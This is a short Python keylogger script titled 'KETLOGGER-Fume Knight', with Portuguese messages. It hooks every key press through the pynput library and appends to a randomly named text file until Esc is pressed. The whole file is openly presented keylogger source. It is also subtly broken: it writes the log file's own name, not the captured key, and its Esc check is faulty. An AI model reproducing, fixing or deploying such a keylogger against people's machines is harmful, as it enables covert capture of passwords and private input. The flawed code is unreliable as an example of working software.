#KETLOGGER-Fume Knight

from pynput.keyboard import Listener,Key
import sys
import random

def encerrar_progranma():
    print("Programa encerrado!")
    sys.exit()
def escreve_key(key):
    try:
        with open (log,'a') as file:
            file.write(f'{str(log)} \n')
    except Exception as e:
        print(f'Erro ao capturar a tecla {e}')
        encerrar_progranma()
    if key == key.esc:
        encerrar_progranma()
log = f'yek{random.randint(0,1000)}.txt'
print(" as teclas estao sendo capturadas!")
with Listener (on_press=escreve_key) as logs:
    try:
        logs.join()
    except Exception as e:
        print("erro durante a execuçao do programa!")
    finally:
        logs.stop()
        encerrar_progranma()